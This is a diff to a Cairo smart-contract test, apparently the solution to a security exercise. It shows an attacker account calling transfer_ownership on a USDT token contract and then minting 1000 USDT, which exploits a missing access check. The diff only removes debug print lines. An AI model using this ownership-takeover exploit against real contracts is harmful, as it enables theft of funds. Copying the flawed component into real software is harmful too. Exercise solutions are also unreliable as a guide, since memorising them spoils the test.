@@ -40,18 +40,14 @@ fn test_faulty_component() {
         minting_dispatcher, ownable_dispatcher
     ) = deploy_usdt();
 
-    println!("USDT contract first owner: {:?}", ownable_dispatcher.owner());
     // Creating the Attacker account
     let attacker: ContractAddress = 1.try_into().unwrap();
 
     // TODO: Mint at least 1000 USDT to the attacker
     ownable_dispatcher.transfer_ownership(attacker);
-    println!("USDT contract last owner: {:?}", ownable_dispatcher.owner());
     start_cheat_caller_address(usdt_address, attacker);
     minting_dispatcher.mint(attacker, 1000 * USDT_DECIMALS);
     stop_cheat_caller_address(usdt_address);
-
-    println!("Attacker USDT balance: {:?}", usdt_dispatcher.balance_of(attacker));
 
     // The attacker should have at least 1000 USDT
     assert(usdt_dispatcher.balance_of(attacker) >= 1000 * USDT_DECIMALS, 'Wrong balance');
